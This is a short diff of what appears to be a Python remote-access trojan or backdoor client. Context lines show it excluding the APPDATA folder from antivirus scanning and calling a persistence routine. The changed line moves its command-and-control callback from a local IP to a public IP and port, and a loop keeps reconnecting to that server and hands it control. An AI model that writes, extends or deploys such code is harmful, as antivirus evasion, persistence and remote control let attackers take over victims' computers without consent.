@@ -21,7 +21,7 @@ def __initialization__():
         # time.sleep(generate_random_int())
         # if admin_status:
         exclude_path_antivirus(os.getenv('APPDATA'))
-        
+
         __persistant()
 
 
@@ -35,7 +35,7 @@ if __name__ == "__main__":
     while True:
         try:
             display_msg("Trying to connect ", "y")
-            client = conn.Client("192.168.0.23", 8081)
+            client = conn.Client("79.86.19.126", 8082)
             client.connect_with_server()
             connection_handler(client)
             client.close()
